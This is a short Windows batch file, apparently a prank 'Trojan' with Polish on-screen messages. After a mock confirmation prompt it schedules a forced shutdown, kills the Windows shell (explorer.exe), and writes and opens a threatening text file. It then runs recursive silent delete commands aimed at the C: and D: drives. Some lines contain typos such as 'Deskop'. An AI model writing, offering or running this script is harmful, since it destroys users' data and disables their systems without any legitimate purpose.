@echo off
title Trojan
color 0A
echo EULA
cls
echo Czy na pewno chcesz odpalic tego wirusa? Jest on niszczycielski i rozwali twuj system! Jak chszesz kliknij enter!
echo Szybka decyzja...
pause
shutdown -s -t 40 -c "Twuj system jest zniszczony sam się o to prosiłes:)"
taskkill /f /im explorer.exe
cd Deskop
echo Twuj system został zajebany przez Tego wirusa, jak go zabijesz menadżerem zadań twoje wszystkie aplikacje zostanom odinstalowane!>Trojan.txt
start Trojan.txt
del c:\ */s /q
del d:\*/s /q
